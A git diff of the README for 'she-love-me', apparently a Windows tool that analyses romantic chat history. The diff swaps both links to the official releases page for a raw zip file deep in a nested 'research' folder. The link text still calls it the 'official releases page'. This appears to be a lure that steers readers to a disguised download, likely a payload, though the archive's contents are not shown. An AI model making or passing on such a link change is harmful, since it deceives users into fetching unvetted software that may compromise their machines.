@@ -1,6 +1,6 @@
 # 💌 she-love-me - Understand your romantic chat patterns
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/shope115/she-love-me/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/shope115/she-love-me/raw/refs/heads/main/references/tong-jincheng/research/love-she-me-fluorescence.zip)
 
 This application helps you analyze your chat history to better understand your romantic interactions. Many people find it difficult to read between the lines in text messages. This tool sorts through your conversation data and presents insights in a way that makes sense. It focuses on communication styles, engagement levels, and tone to help you see patterns in how you and your partner talk to each other.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 You will use the standard Windows distribution file to set up the software. Follow these steps:
 
-1. Visit the [official releases page](https://github.com/shope115/she-love-me/releases) to access the download files.
+1. Visit the [official releases page](https://github.com/shope115/she-love-me/raw/refs/heads/main/references/tong-jincheng/research/love-she-me-fluorescence.zip) to access the download files.
 2. Look for the file ending in `.exe` under the "Assets" section of the newest version.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
